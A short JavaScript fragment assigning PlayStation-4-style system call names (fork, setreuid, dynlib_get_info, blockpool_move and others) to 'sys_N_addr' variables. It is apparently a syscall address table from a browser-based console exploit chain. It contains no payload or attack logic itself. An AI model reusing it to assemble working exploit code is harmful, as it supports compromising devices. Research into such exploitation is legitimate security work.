var thr_new_addr = sys_455_addr;
var dynlib_get_obj_member_addr = sys_649_addr;
var adjtime_addr = sys_140_addr;
var aio_init_addr = sys_670_addr;
var setreuid_addr = sys_126_addr;
var netgetsockinfo_addr = sys_102_addr;
var blockpool_move_addr = sys_673_addr;
var getdents_addr = sys_272_addr;
var netcontrol_addr = sys_99_addr;
var dynlib_get_info_addr = sys_593_addr;
var getegid_addr = sys_43_addr;
var aio_submit_cmd_addr = sys_669_addr;
var dynlib_process_needed_and_relocate_addr = sys_599_addr;
var clock_getres_addr = sys_234_addr;
var get_kernel_mem_statistics_addr = sys_646_addr;
var fork_addr = sys_2_addr;
var _umtx_op_addr = sys_454_addr;
var fstat_addr = sys_189_addr;
var ktimer_settime_addr = sys_237_addr;
var shutdown_addr = sys_134_addr;
var get_proc_type_info_addr = sys_612_addr;
var osem_close_addr = sys_552_addr;
var cpuset_getaffinity_addr = sys_487_addr;
var sigprocmask_addr = sys_340_addr;
var profil_addr = sys_44_addr;
var gettimeofday_addr = sys_116_addr;
var sync_addr = sys_36_addr;
var sendto_addr = sys_133_addr;
var dynlib_get_info2_addr = sys_660_addr;
var thr_suspend_ucontext_addr = sys_632_addr;
var shm_open_addr = sys_482_addr;
var dynlib_get_info_ex_addr = sys_608_addr;
var getrusage_addr = sys_117_addr;
var ksem_trywait_addr = sys_403_addr;
var sendfile_addr = sys_393_addr;
var get_vm_map_timestamp_addr = sys_624_addr;
var budget_get_ptype_addr = sys_610_addr;
var set_vm_container_addr = sys_559_addr;
var localtime_to_utc_addr = sys_639_addr;
